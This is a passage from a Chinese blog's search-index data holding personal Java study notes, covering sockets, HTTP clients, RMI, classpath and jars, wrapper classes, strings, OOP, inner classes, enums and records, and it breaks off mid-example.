System.out.println(\u0026#34;Server is running...\u0026#34;); for(;;){ Socket sock = ss.accept(); System.out.println(\u0026#34;connected from \u0026#34; + sock.getRemoteSocketAddress()); Thread t = new Handler(sock); t.start(); } } } class Handler extends Thread{ Socket sock; public Handler(Socket sock){ this.sock = sock; } @Override public void run(){ try(InputStream input = this.sock.getInputStream()){ try(OutputStream output = this.sock.getOutputStream()){ handle(input, output); } }catch (Exception e){ try { this.sock.close(); }catch (IOException ioe){ } System.out.println(\u0026#34;Client disconnected\u0026#34;); } } private void handle(InputStream input, OutputStream output) throws IOException{ var writer = new BufferedWriter(new OutputStreamWriter(output, StandardCharsets.UTF_8)); var reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8)); writer.write(\u0026#34;hello\\n\u0026#34;); writer.flush(); for (;;){ String s = reader.readLine(); if(s.equals(\u0026#34;bye\u0026#34;)){ writer.write(\u0026#34;bye~\\n\u0026#34;); writer.flush(); break; } writer.write(\u0026#34;ok: \u0026#34; + s + \u0026#34;\\n\u0026#34;); writer.flush(); } } } public class Client { public static void main(String[] args) throws IOException { Socket sock = new Socket(\u0026#34;localhost\u0026#34;, 6666); // 连接指定服务器和端口 try (InputStream input = sock.getInputStream()) { try (OutputStream output = sock.getOutputStream()) { handle(input, output); } } sock.close(); System.out.println(\u0026#34;disconnected.\u0026#34;); } private static void handle(InputStream input, OutputStream output) throws IOException { var writer = new BufferedWriter(new OutputStreamWriter(output, StandardCharsets.UTF_8)); var reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8)); Scanner scanner = new Scanner(System.in); System.out.println(\u0026#34;[server] \u0026#34; + reader.readLine()); for (;;) { System.out.print(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;); // 打印提示 String s = scanner.nextLine(); // 读取一行输入 writer.write(s); writer.newLine(); writer.flush(); String resp = reader.readLine(); System.out.println(\u0026#34;\u0026lt;\u0026lt;\u0026lt; \u0026#34; + resp); if (resp.equals(\u0026#34;bye\u0026#34;)) { break; } } } } 注意flush()，不然可能都收不到消息\nSocket - UDP Server\nDatagramSocket ds = new DatagramSocket(6666); // 监听指定端口 for (;;) { // 无限循环 // 数据缓冲区: byte[] buffer = new byte[1024]; DatagramPacket packet = new DatagramPacket(buffer, buffer.length); ds.receive(packet); // 收取一个UDP数据包 // 收取到的数据存储在buffer中，由packet.getOffset(), packet.getLength()指定起始位置和长度 // 将其按UTF-8编码转换为String: String s = new String(packet.getData(), packet.getOffset(), packet.getLength(), StandardCharsets.UTF_8); // 发送数据: byte[] data = \u0026#34;ACK\u0026#34;.getBytes(StandardCharsets.UTF_8); packet.setData(data); ds.send(packet); } 接收UDP数据包之前先要准备缓冲区，并通过DatagramPacket实现接收\n假设我们收取到的是一个String，那么，通过DatagramPacket返回的packet.getOffset()和packet.getLength()确定数据在缓冲区的起止位置\n当服务器收到一个DatagramPacket后，通常必须立刻回复一个或多个UDP包，因为客户端地址在DatagramPacket中，每次收到的DatagramPacket可能是不同的客户端，如果不回复，客户端就收不到任何UDP包\nClient\nDatagramSocket ds = new DatagramSocket(); ds.setSoTimeout(1000); ds.connect(InetAddress.getByName(\u0026#34;localhost\u0026#34;), 6666); // 连接指定服务器和端口 // 发送: byte[] data = \u0026#34;Hello\u0026#34;.getBytes(); DatagramPacket packet = new DatagramPacket(data, data.length); ds.send(packet); // 接收: byte[] buffer = new byte[1024]; packet = new DatagramPacket(buffer, buffer.length); ds.receive(packet); String resp = new String(packet.getData(), packet.getOffset(), packet.getLength()); ds.disconnect(); 这里的connect不是真连接，它是为了在客户端的DatagramSocket实例中保存服务器端的IP和端口号，确保这个DatagramSocket实例只能往指定的地址和端口发送UDP包，不能往其他地址和端口发送。这么做不是UDP的限制，而是Java内置了安全检查。\n如果客户端希望向两个不同的服务器发送UDP包，那么它必须创建两个DatagramSocket实例。\n后续的收发数据和服务器端是一致的。通常来说，客户端必须先发UDP包，因为客户端不发UDP包，服务器端就根本不知道客户端的地址和端口号。\ndisconnect()也不是真正地断开连接，它只是清除了客户端DatagramSocket实例记录的远程服务器地址和端口号，这样，DatagramSocket实例就可以连接另一个服务器端。\nHttpClient URL url = new URL(\u0026#34;http://www.example.com/path/to/target?a=1\u0026amp;b=2\u0026#34;); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod(\u0026#34;GET\u0026#34;); conn.setUseCaches(false); conn.setConnectTimeout(5000); // 请求超时5秒 // 设置HTTP头: conn.setRequestProperty(\u0026#34;Accept\u0026#34;, \u0026#34;*/*\u0026#34;); conn.setRequestProperty(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)\u0026#34;); // 连接并发送HTTP请求: conn.connect(); // 判断HTTP响应是否200: if (conn.getResponseCode() != 200) { throw new RuntimeException(\u0026#34;bad response\u0026#34;); } // 获取所有响应Header: Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; map = conn.getHeaderFields(); for (String key : map.keySet()) { System.out.println(key + \u0026#34;: \u0026#34; + map.get(key)); } // 获取响应内容: InputStream input = conn.getInputStream(); ... 从Java 11开始，引入了新的HttpClient\nimport java.net.URI; import java.net.http.*; import java.net.http.HttpClient.Version; import java.time.Duration; import java.util.*; public class Main { // 全局HttpClient: static HttpClient httpClient = HttpClient.newBuilder().build(); public static void main(String[] args) throws Exception { String url = \u0026#34;https://www.sina.com.cn/\u0026#34;; HttpRequest request = HttpRequest.newBuilder(new URI(url)) // 设置Header: .header(\u0026#34;User-Agent\u0026#34;, \u0026#34;Java HttpClient\u0026#34;).header(\u0026#34;Accept\u0026#34;, \u0026#34;*/*\u0026#34;) // 设置超时: .timeout(Duration.ofSeconds(5)) // 设置版本: .version(Version.HTTP_2).build(); HttpResponse\u0026lt;String\u0026gt; response = httpClient.send(request, HttpResponse.BodyHandlers.ofString()); // HTTP允许重复的Header，因此一个Header可对应多个Value: Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; headers = response.headers().map(); for (String header : headers.keySet()) { System.out.println(header + \u0026#34;: \u0026#34; + headers.get(header).get(0)); } System.out.println(response.body().substring(0, 1024) + \u0026#34;...\u0026#34;); } } post\nString url = \u0026#34;http://www.example.com/login\u0026#34;; String body = \u0026#34;username=bob\u0026amp;password=123456\u0026#34;; HttpRequest request = HttpRequest.newBuilder(new URI(url)) // 设置Header: .header(\u0026#34;Accept\u0026#34;, \u0026#34;*/*\u0026#34;) .header(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;) // 设置超时: .timeout(Duration.ofSeconds(5)) // 设置版本: .version(Version.HTTP_2) // 使用POST并设置Body: .POST(BodyPublishers.ofString(body, StandardCharsets.UTF_8)).build(); HttpResponse\u0026lt;String\u0026gt; response = httpClient.send(request, HttpResponse.BodyHandlers.ofString()); String s = response.body(); RMI 一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法\n要实现RMI，服务器和客户端必须共享同一个接口interface，测试\npublic interface WorldClock extends Remote { LocalDateTime getLocalDateTime(String zoneId) throws RemoteException; } 此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException\n下一步是编写服务器的实现类，因为客户端请求的调用方法getLocalDateTime()最终会通过这个实现类返回结果\npublic class WorldClockService implements WorldClock{ @Override public LocalDataTime getLocalDateTime(String zoneId) throws RemoteException{ return LocalDataTime.now(ZoneId.of(zoneId)).withNano(0); } } 现在需要通过Java RMI提供的一系列底层支持接口，把上面编写的服务以RMI的形式暴露在网络上，客户端才能调用\npublic class Server { public static void main(String[] args) throws RemoteException { System.out.println(\u0026#34;create World clock remote service...\u0026#34;); // 实例化一个WorldClock: WorldClock worldClock = new WorldClockService(); // 将此服务转换为远程服务接口: WorldClock skeleton = (WorldClock) UnicastRemoteObject.exportObject(worldClock, 0); // 将RMI服务注册到1099端口: Registry registry = LocateRegistry.createRegistry(1099); // 注册此服务，服务名为\u0026#34;WorldClock\u0026#34;: registry.rebind(\u0026#34;WorldClock\u0026#34;, skeleton); } } 由于RMI要求服务器和客户端共享同一个接口，因此我们要把WorldClock.java这个接口文件复制到客户端，然后在客户端实现RMI调用\npublic class Client { public static void main(String[] args) throws RemoteException, NotBoundException { // 连接到服务器localhost，端口1099: Registry registry = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;, 1099); // 查找名称为\u0026#34;WorldClock\u0026#34;的服务并强制转型为WorldClock接口: WorldClock worldClock = (WorldClock) registry.lookup(\u0026#34;WorldClock\u0026#34;); // 正常调用接口方法: LocalDateTime now = worldClock.getLocalDateTime(\u0026#34;Asia/Shanghai\u0026#34;); // 打印调用结果: System.out.println(now); } } 对客户端来说，客户端持有的WorldClock接口实际上对应了一个“实现类”，它是由Registry内部动态生成的，并负责把方法调用通过网络传递到服务器端。而服务器端接收网络调用的服务并不是我们自己编写的WorldClockService，而是Registry自动生成的代码。我们把客户端的“实现类”称为stub，而服务器端的网络服务类称为skeleton，它会真正调用服务器端的WorldClockService，获取结果，然后把结果通过网络传递给客户端\nRMI通过自动生成stub和skeleton实现网络调用，客户端只需要查找服务并获得接口实例，服务器端只需要编写实现类并注册为服务\n整个过程由RMI底层负责实现序列化和反序列化，很容易产生安全问题\n其它的语法等遇到了再学，估计还会有个Java语法补全下篇（如果我不懒的话\n","date":"2022-02-28T02:40:55+08:00","permalink":"https://amiaaaz.github.io/2022/02/28/java-study-notes-02/","section":"posts","tags":["Java"],"title":"Java学习笔记Ⅱ"},{"categories":["NOTES\u0026SUMMARY"],"contents":"ctf里有几类题我是见到之后拔腿就跑，比如java和xss，对于后者，最近杂七杂八的学了很多js和前端的知识 没那么发怵了，而前者……不多说了，学学学！\n本篇学习内容来自于廖雪峰Java教程，个人感觉比较适合对其它语言也有一点掌握的人\n本机win10，为了兼容一些程序暂时有java8和11两个版；ide使用idea\nJava基础 java程序结构 src/xxx.java，类名为文件名，main为入口（idea直接输main会自动补全），idea格式化代码ctrl+shift+F 类class习惯大写字母开头，方法method习惯小写字母开头，必须带分号（不同于js可有可无） classpath\u0026amp;jar classpath是JVM的环境变量，是一组目录的集合（分隔符由系统定 推荐在启动JVM时设置classpath变量，不要污染系统环境（可以放心的交给idea java -classpath .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello java -cp .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello 不要把任何Java核心库添加到classpath中！默认的当前目录.对于绝大多数情况都够用\njar包实际上就是一个zip格式的压缩文件，包含package组织的目录层级，以及各个目录下的所有文件（包括.class文件和其他文件），注意不含bin目录（注意层级）\n可以把jar理解为n多个class文件的容器，JVM自带的Java标准库rt.jar也是以jar形式进行存放\njar不关心class之间的依赖，如果漏掉的话在运行期极有可能抛出ClassNotFoundException\n如果我们要执行一个jar包的class，就可以把jar包放到classpath中\njava -cp ./hello.jar abc.xyz.Hello MANIFEST.MF文件可以提供jar包的信息，如Main-Class 分析题目中给出jar包时我一般直接改zip解压，用idea打开整个目录作为项目（idea yyds 模块 Java9后引入，解决依赖问题，控制jar之间的相互调用 把一堆class封装为jar仅仅是一个打包的过程，而把一堆class封装为模块则不但需要打包，还需要写入依赖关系，并且还可以包含二进制代码（通常是JNI扩展） 以java的标准库rt.jar为例，被拆为 java.base.jmod java.compiler.jmod java.datatransfer.jmod java.desktop.jmod ... 以.jmod为拓展名标识，每个文件都是一个模块，模块java.base对应的文件就是java.base.jmod\n模块之间的依赖关系已经被写入到模块内的module-info.class文件了。所有的模块都直接或间接地依赖java.base模块，只有java.base模块不依赖任何模块，它可以被看作是根模块，好比所有的类都是从Object直接或间接继承而来 编写模块的部分暂略。\nJavaBean 指的是符合某种规范的一种编程模式或编程思想（个人理解\n部分Python爱好者也喜欢这么写，可拓展性强，就是很臃肿\n写方法setter，读方法getter，只有其中一种属性之一的被称为只写/读属性——满足这样规范的class被称为JavaBean // 读方法: public Type getXyz() // 写方法: public void setXyz(Type value) 要枚举一个JavaBean的所有属性，可以直接使用Java核心库提供的Introspector import java.beans.*; public class Main { public static void main(String[] args) throws Exception { BeanInfo info = Introspector.getBeanInfo(Person.class);\t// 获取属性列表 for (PropertyDescriptor pd : info.getPropertyDescriptors()) { System.out.println(pd.getName()); System.out.println(\u0026#34; \u0026#34; + pd.getReadMethod()); System.out.println(\u0026#34; \u0026#34; + pd.getWriteMethod()); } } } class Person { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 语法基础 变量\u0026amp;数据类型 类似c的赋值风格：类型 变量名 = 变量值（不同于go） 程序设计的一个重要原则：数据的存储和显示要分离 执行int x = n这样的变量赋值时，相当于两步操作，x与n是不同的存储单元 基本类型有byte, int, short, long, float, double, boolean, char（表示ascii或一个Unicode字符），不可赋值null 引用类型为所有class和interface类型，可赋值为null表示空 使用对应的Wrapper Class包装类可以将基本类型视为引用类型(class)，好处是可以使用大量的实用方法 public class Main { public static void main(String[] args) { int i = 100; // 通过new操作符创建Integer实例(不推荐使用,会有编译警告): Integer n1 = new Integer(i); // 通过静态方法valueOf(int)创建Integer实例: Integer n2 = Integer.valueOf(i); // 通过静态方法valueOf(String)创建Integer实例: Integer n3 = Integer.valueOf(\u0026#34;100\u0026#34;); System.out.println(n3.intValue()); } } 每种基本类型都有其包装类型 基本类型 对应的引用类型 boolean java.lang.Boolean byte java.lang.Byte short java.lang.Short int java.lang.Integer long java.lang.Long float java.lang.Float double java.lang.Double char java.lang.Character 所有的整数和浮点数的包装类型都继承自Number，因此，可以非常方便地直接通过包装类型获取各种基本类型 // 向上转型为Number: Number num = new Integer(999); // 获取byte, int, long, float, double: byte b = num.byteValue(); int n = num.intValue(); long ln = num.longValue(); float f = num.floatValue(); double d = num.doubleValue(); 由于java中并不存在无符号整型这一说，全部都是有整型的，需要通过包装类型的静态方法来完成，比如Byte.toUnsignedInt()\nint和对应的Integer可以互相转化，甚至直接使用\nInteger n = 100; // 编译器自动使用Integer.valueOf(int) int x = n; // 编译器自动使用Integer.intValue() 这种直接把int变为Integer的赋值写法，称为自动装箱（Auto Boxing）；反过来，把Integer变为int的赋值写法，称为自动拆箱（Auto Unboxing）\n注意：自动装箱和自动拆箱只发生在编译阶段，目的是为了少写代码。\n装箱和拆箱会影响代码的执行效率，因为编译后的class代码是严格区分基本类型和引用类型的。并且，自动拆箱执行时可能会报NullPointerException（两种类型对null的容忍度不同\npublic class Main { public static void main(String[] args) { Integer n = null; int i = n; } } // NullPointerException 所有包装类型都是不变类，和String一样通过内部的private final int字段实现，无法派生子类 判断值类型的变量是否相等可用==，但是包装类型必须用equals比较（引用类型存在值相等但指向不同对象的情况）！！！详细的演示 public class Main { public static void main(String[] args) { Integer x = 127; Integer y = 127; Integer m = 99999; Integer n = 99999; System.out.println(\u0026#34;x == y: \u0026#34; + (x==y)); // true System.out.println(\u0026#34;m == n: \u0026#34; + (m==n)); // false System.out.println(\u0026#34;x.equals(y): \u0026#34; + x.equals(y)); // true System.out.println(\u0026#34;m.equals(n): \u0026#34; + m.equals(n)); // true } } ==比较，较小的两个相同的Integer返回true，较大的两个相同的Integer返回false，这是因为Integer是不变类，编译器把Integer x = 127;自动变为Integer x = Integer.valueOf(127);\n为了节省内存，Integer.valueOf()对于较小的数，始终返回相同的实例，因此==比较“恰好”为true，但我们绝不能因为Java标准库的Integer内部有缓存优化就用==比较，必须用equals()方法比较两个Integer\n因为Integer.valueOf()可能始终返回同一个Integer实例，因此，在我们自己创建Integer的时候，以下两种方法： Integer n = new Integer(100); Integer n = Integer.valueOf(100); 方法二更好，不用每次都new新的实例而是直接使用静态工厂方法进行调用，它会做到内部优化，尽可能地返回缓存的实例以节省内存\nString作引用类型，类似c中的指针，内部存储一个指向内存中的地址 加上final表示常量，创建实例后无法修改 类型名过长时可用var代替 instanceof()确定类型 运算 溢出不报错，注意自检 优先级太多记不住，统一加括号完事了 两种类型不同的数进行运算时会存在类型的隐式转换（short+int -\u0026gt; int+int），注意运算精度 整数运算很准确，没有必要为了节省内存而使用byte和short进行整数运算 整数运算在除数为0时会报错，而浮点数运算在除数为0时，不会报错，返回NAN or Infinity or -Infinity 布尔关系和三元运算中注意逻辑短路 三元运算b ? x : y后面的类型必须相同 字符\u0026amp;字符串 Java的String和char在内存中总是以Unicode编码表示 字符char用''，字符串用\u0026quot;\u0026quot;（空字符串不等于null），字符串拼接存在类型隐式转换，\u0026quot;\u0026quot;\u0026quot; \u0026quot;\u0026quot;\u0026quot;写多行字符串（同py） java中的字符串赋值操作可直接联想c的指针进行理解，通过内部的private final char[]字段 以及没有任何修改char[]的方法实现字符串的不可变性；基于这一点，如果传入的对象有可能改变，我们需要复制而不是直接引用 字符串比较必须用equals()或equalsIgnoreCase()，不可偷懒用== 更多字符串的用法可几乎等同于Python，不列举\nString和char[]类型可以互相转换 char[] cs = \u0026#34;Hello\u0026#34;.toCharArray(); // String -\u0026gt; char[] String s = new String(cs); // char[] -\u0026gt; String 如果修改了char[]数组，String并不会改变 public class Main { public static void main(String[] args) { char[] cs = \u0026#34;Hello\u0026#34;.toCharArray(); String s = new String(cs); System.out.println(s); cs[0] = \u0026#39;X\u0026#39;; System.out.println(s); } } 这是因为通过new String(char[])创建新的String实例时，它并不会直接引用传入的char[]数组，而是会复制一份，所以，修改外部的char[]数组不会影响String实例内部的char[]数组，因为这是两个不同的数组\n早期的String总以char[]进行存储 public final class String { private final char[] value; private final int offset; private final int count; } 而较新的JDK版本的String则以byte[]存储：如果String仅包含ASCII字符，则每个byte存储一个字符，否则，每两个byte存储一个字符，这样做的目的是为了节省内存，因为大量的长度较短的String通常仅包含ASCII字符\npublic final class String { private final byte[] value; private final byte coder; // 0 = LATIN1, 1 = UTF16 对于使用者来说，String内部的优化不影响任何已有代码，因为它的public方法签名是不变的\n数组 新建数组int[] n = new int[5];，大小不可变，为引用类型 对于数组元素（或所有可迭代的数据类型）的遍历直接使用for(int n:na){}，缺点是无法指定遍历顺序，无法获取数组索引（n直接代表元素） 快速打印数组内容System.out.println(Arrays.toString(ns)); 快速打印二维数组内容System.out.println(Arrays.deepToString(ns)); 可变参数用类型...定义，可变参数相当于数组类型 流程控制 读取输入需要import java.util.Scanner，由Scanner对象进行读入操作 import java.util.Scanner; public class hello { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print(\u0026#34;Input your name: \u0026#34;); String name = scanner.nextLine(); System.out.print(\u0026#34;Input your age: \u0026#34;); int age = scanner.nextInt(); System.out.printf(\u0026#34;Hi, %s, you are %d\\n\u0026#34;, name, age); } } switch语句不要忘break，case不用花括号 default语句，可以在漏写某个枚举常量时自动报错，从而及时发现错误 OOP基础 类\u0026amp;实例 对象靠new 一个java源文件可以包含多个类的定义，但只能定义一个public类，且public类名必须与文件名一致；如果要定义多个public类，必须拆到多个Java源文件中 方法 语法 修饰符 方法返回类型 方法名(方法参数列表) { 若干方法语句; return 方法返回值; } // 无return 返回类型为void 变量设为private后可以通过public对外的方法间接修改 没事儿就尽可能少用public，少暴露对外的方法 与类名相同的方法作为construct构造方法，无返回值 先初始化字段，再执行构造方法（可覆盖前面的 可定义多个构造方法（传入参数类型 数量不同），new时会自动匹配；一个构造方法可以调用其他构造方法（便于代码复用），语法 class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public Person(String name) { this(name, 18); // 调用另一个构造方法Person(String, int) } public Person() { this(\u0026#34;Unnamed\u0026#34;); // 调用另一个构造方法Person(String) } } 非构造方法也可有多个重名的（参数不同 返回值通常相同），称为方法重载(Overload)，便于用一个名字处理多种参数输入 继承\u0026amp;多态 使用extends关键字，例class Student extends Person subclass == extended class; super class == parent class == base class 子类不可访问父类的private字段和方法，不能覆写父类带有final关键字的方法，不能继承带有final的类，不能重新赋值带有final的字段 private访问权限被限定在class的内部，而且与方法声明顺序无关；如果一个类内部还定义了nested class嵌套类，那么，嵌套类拥有访问private的权限 定义为protected的字段和方法可以被子类访问，以及子类的子类 继承之后super.name, this.name, name都是一个意思，但如果存在方法覆写后调用父类方法就必须用super.name（联想NodeJS的.call, .apply 异曲同工之妙） 未注明extends xxx的类自动被补上了extends Object，最顶层的object也是可以被覆写的 任何类的构造方法中第一行语句必须是调用父类的构造方法，如未注明会自动补上super();，所以如果父类没有默认的构造方法，子类就必须显式调用super()并给出参数以便让编译器定位到父类的一个合适的构造方法————一句话：子类不继承父类的构造方法，是自动生成的（联想Nodejs执行代码时的wrapper） Java15之后允许sealed修饰class，并可通过permits限制能从该类继承的子类名称（目前为预览状态，可开启--enable-preview和--source 15开启） public sealed class Shape permits Rect, Circle, Triangle { // xxx } 向上转型基本无问题，向下可能回报ClassCastException的错误，用instanceof判断一个实例究竟是不是某种类型 子类与父类方法签名完全相同时可覆写(Override)，加上@Override可以让编译器帮助检查是否进行了正确的覆写（非必要） new来的对象如果指定的类型不同，实际调用其方法时会不同，run起来才知道具体用的啥，这个叫多态(Polymorphic)，有助于实现功能拓展，封装底层逻辑 优化交互 抽象类\u0026amp;接口 抽象类不实现任何功能 仅为了定义方法签名，目的就是为了让子类继承并覆盖，注意这个类本身也要声明为abstract作抽象类 abstract class Person { public abstract void run();\t// 无子句 } 当我们定义了一个抽象类和N个具体类，我们可以用抽象类作引用类型去引用具体类的子类实例，好处在于对实例的方法进行调用时并不关心抽象类型变量的具体子类型 Person s = new Student(); Person t = new Teacher(); // 不关心Person变量的具体子类型: s.run(); t.run(); // 同样不关心新的子类是如何实现run()方法的： Person e = new Employee(); e.run(); 这种尽量引用高层类型，避免引用实际子类型的方式，称之为面向抽象编程，本质：\n上层代码只定义规范(abstract class Person)，不需要子类就可以实现业务逻辑（正常编译），具体的业务逻辑由不同的子类实现，调用者并不关心\ninterface比抽象类还抽象的纯抽象接口，无实例字段，所有方法都默认public abstract interface Person { void run(); String getName(); } 当具体类实现一个接口时需要用implements class Student implements Person { private String name; public Student(String name) { this.name = name; } @Override public void run() { System.out.println(this.name + \u0026#34; run\u0026#34;); } @Override public String getName() { return this.name; } } 一个类可以实现多个接口，一个接口也可以继承自另一个接口 class Student implements Person, Hello { // 实现了两个interface ... } interface Person extends Hello {\t// 继承另一个接口 void run(); String getName(); } 在接口中，可以定义default方法；default方法和抽象类的普通方法是有所不同的。因为interface没有字段，default方法无法访问字段，而抽象类的普通方法可以访问实例字段(Java\u0026gt;=1.8) 静态字段\u0026amp;静态方法 用static关键字修饰的字段处于同一个共享作用域中\n不推荐用实例.静态字段去访问静态字段，因为在java中实例对象并没有静态字段(实际)，代码中可以访问是因为编译器可以根据实例类型自动转换为类名.静态字段来访问\n推荐用类名来访问静态字段，可以将其理解为类本身的字段\n调用实例方法必须通过一个实例变量，而调用静态方法则不需要实例变量，通过类名就可以调用\npublic class Main { public static void main(String[] args) { Person.setNumber(99); System.out.println(Person.number); } } class Person { public static int number; public static void setNumber(int value) { number = value; } } 静态方法内部无法访问this，也无法访问实例字段，只能访问静态字段 静态方法常用于工具类，比如Arrays.sort()和Math.random()；java程序入口的main也是静态方法噢 对于接口而言虽然不能有实例字段，但是可以有public static final加持的静态字段 public interface Person { public static final int MALE = 1; public static final int FEMALE = 2; } // 可简写 public interface Person { // 编译器会自动加上public statc final: int MALE = 1; int FEMALE = 2; } 包 使用package包来解决名字冲突（各个语言都有了 很好懂），可以用类的全名 包没有父子关系！java.util和java.util.zip是不同的包，两者没有任何继承关系 所有Java文件对应的目录层次要和包的层次一致，编译后的.class文件也需要按照包结构存放 位于同一个包的类，可以访问包作用域的字段和方法。不用public、protected、private修饰的字段和方法就是包作用域 import static可以导入可以导入一个类的静态字段和静态方法 Java编译器最终编译出的.class文件只使用完整类名(超长)，所以编译器在遇到class名称时如果非完整类名，按照 当前package-\u0026gt;import的包-\u0026gt;java.lang包 的顺序进行查找 // Main.java package test; import java.text.Format; public class Main { public static void main(String[] args) { java.util.List list; // ok，使用完整类名 -\u0026gt; java.util.List Format format = null; // ok，使用import的类 -\u0026gt; java.text.Format String s = \u0026#34;hi\u0026#34;; // ok，使用java.lang包的String -\u0026gt; java.lang.String System.out.println(s); // ok，使用java.lang包的System -\u0026gt; java.lang.System MessageFormat mf = null; // 编译错误：无法找到MessageFormat: MessageFormat cannot be resolved to a type } } 编写class时，编译器自动帮我们import java.lang.*(不包含java.lang.reflect这样的包)和import当前package的其它class 把方法定义为package权限有助于测试，因为测试类和被测试类只要位于同一个package，测试代码就可以访问被测试类的package权限方法 内部类 或称nested class嵌套类 Inner Class定义在一个类的内部，它的实例不能单独存在 public class Main { public static void main(String[] args) { Outer outer = new Outer(\u0026#34;Nested\u0026#34;); // 实例化一个Outer Outer.Inner inner = outer.new Inner(); // 实例化一个Inner inner.hello(); } } class Outer { private String name; Outer(String name) {\t// 调用Outer的构造方法来创建Inner实例 this.name = name; } class Inner { void hello() { System.out.println(\u0026#34;Hello, \u0026#34; + Outer.this.name); } } } 原因是Inner Class除了this指向自己以外还隐含地持有一个Outer Class实例，可以用Outer.this访问这个实例；所以，实例化一个Inner Class不能脱离Outer实例\nInner Class和普通Class相比，除了能引用Outer实例外，还有一个额外的特权：可以修改Outer Class的private字段；因为Inner Class的作用域在Outer Class内部，所以能访问Outer Class的private字段和方法\n观察Java编译器编译后的.class文件可以发现，Outer类被编译为Outer.class，而Inner类被编译为Outer$Inner.class\n还可以通过匿名类Anonymous Class来定义Inner Class，两者本质上相同 public class Main { public static void main(String[] args) { Outer outer = new Outer(\u0026#34;Nested\u0026#34;); outer.asyncHello(); } } class Outer { private String name; Outer(String name) { this.name = name; } void asyncHello() { Runnable r = new Runnable() {\t// @Override public void run() { System.out.println(\u0026#34;Hello, \u0026#34; + Outer.this.name); } }; new Thread(r).start(); } } Runnabale本身是不能实例化的接口，这里实际定义了一个实现了Runnable接口的匿名类，并通过new实例化 之后转型为Runnable，过程很多但是实现起来代码很简洁；和Inner Class一样也可以访问Outer Class的private\n匿名类在定义时必须实例化，最终会编译为Outer$1.class Runnable r = new Runnable(){ // 实现必要的抽象方法... }; 继承自普通类的匿名类，编译为Main$1.class和Main$2.class两个匿名类文件 import java.util.HashMap; public class Main { public static void main(String[] args) { HashMap\u0026lt;String, String\u0026gt; map1 = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;String, String\u0026gt; map2 = new HashMap\u0026lt;\u0026gt;() {}; // 匿名类! HashMap\u0026lt;String, String\u0026gt; map3 = new HashMap\u0026lt;\u0026gt;() { { put(\u0026#34;A\u0026#34;, \u0026#34;1\u0026#34;); put(\u0026#34;B\u0026#34;, \u0026#34;2\u0026#34;); } }; System.out.println(map3.get(\u0026#34;A\u0026#34;)); } } 静态内部类示例 public class Main { public static void main(String[] args) { Outer.StaticNested sn = new Outer.StaticNested(); sn.hello(); } } class Outer { private static String NAME = \u0026#34;OUTER\u0026#34;; private String name; Outer(String name) { this.name = name; } static class StaticNested { void hello() { System.out.println(\u0026#34;Hello, \u0026#34; + Outer.NAME); } } } 用static修饰的内部类和Inner Class有很大的不同，它不再依附于Outer的实例，而是一个完全独立的类，因此无法引用Outer.this，但它仍然可以访问Outer的private静态字段和静态方法；如果把StaticNested移到Outer之外，就失去了访问private的权限\nJava核心类(部分) StringBuilder 是一个可变对象，可以预分配缓冲区，向其中新增字符时，不会创建新的临时对象 StringBuilder sb = new StringBuilder(1024); for (int i = 0; i \u0026lt; 1000; i++) { sb.append(\u0026#39;,\u0026#39;); sb.append(i); } String s = sb.toString(); 可链式操作 public class Main { public static void main(String[] args) { var sb = new StringBuilder(1024); sb.append(\u0026#34;Mr \u0026#34;) .append(\u0026#34;Bob\u0026#34;) .append(\u0026#34;!\u0026#34;) .insert(0, \u0026#34;Hello, \u0026#34;); System.out.println(sb.toString()); } } 实现的关键是定义的append()方法会返回this，这样就可以不断调用自身的其他方法；仿写链式调用函数 public class Main { public static void main(String[] args) { Adder adder = new Adder(); adder.add(3) .add(5) .inc() .add(10); System.out.println(adder.value()); } } class Adder { private int sum = 0; public Adder add(int n) { sum += n; return this; } public Adder inc() { sum ++; return this; } public int value() { return sum; } } StringBuffer和StringBuilder接口完全相同，是早期版本，通过同步来保证多个线程操作StringBuffer也是安全的，但是同步会带来执行速度的下降 enum public class Main { public static void main(String[] args) { Weekday day = Weekday.SUN; if (day == Weekday.SAT || day == Weekday.SUN) { System.out.println(\u0026#34;Work at home!\u0026#34;); } else { System.out.println(\u0026#34;Work at office!\u0026#34;); } } } enum Weekday {\t// 只需依次列出枚举的常量名 SUN, MON, TUE, WED, THU, FRI, SAT; } enum常量本身带有类型信息，即Weekday.SUN类型是Weekday，编译器会自动检查出类型错误\n不可能引用到非枚举的值，因为无法通过编译\n不同类型的枚举不能互相比较或者赋值，因为类型不符\nenum虽然也是引用类型，但因为其在JVM中只有唯一实例，所以可以直接用==比较\n继承自java.lang.Enum，无法被继承，无法new实例\n枚举类的字段也可以是非final类型，即可以在运行期修改，但是不推荐这样\n天生适合switch，具有类型信息和有限个枚举常量\npublic class Main { public static void main(String[] args) { Weekday day = Weekday.SUN; switch(day) { case MON: case TUE: case WED: case THU: case FRI: System.out.println(\u0026#34;Today is \u0026#34; + day + \u0026#34;. Work at office!\u0026#34;); break; case SAT: case SUN: System.out.println(\u0026#34;Today is \u0026#34; + day + \u0026#34;. Work at home!\u0026#34;); break; default: throw new RuntimeException(\u0026#34;cannot process \u0026#34; + day); } } } enum Weekday { MON, TUE, WED, THU, FRI, SAT, SUN; } record java14开始\n不变类的class和字段都使用final关键字，无法派生子类，创建实例后无法修改任何字段 创建不变类后为了保证不变类的比较，还需要正确覆写equals()和hashCode()方法，手动覆写很麻烦，可以直接用record一行写出不变类 public final class Point { private final int x; private final int y; public Point(int x, int y) { this.x = x; this.y = y; } public int x() { return this.x; } public int y() { return this.y; 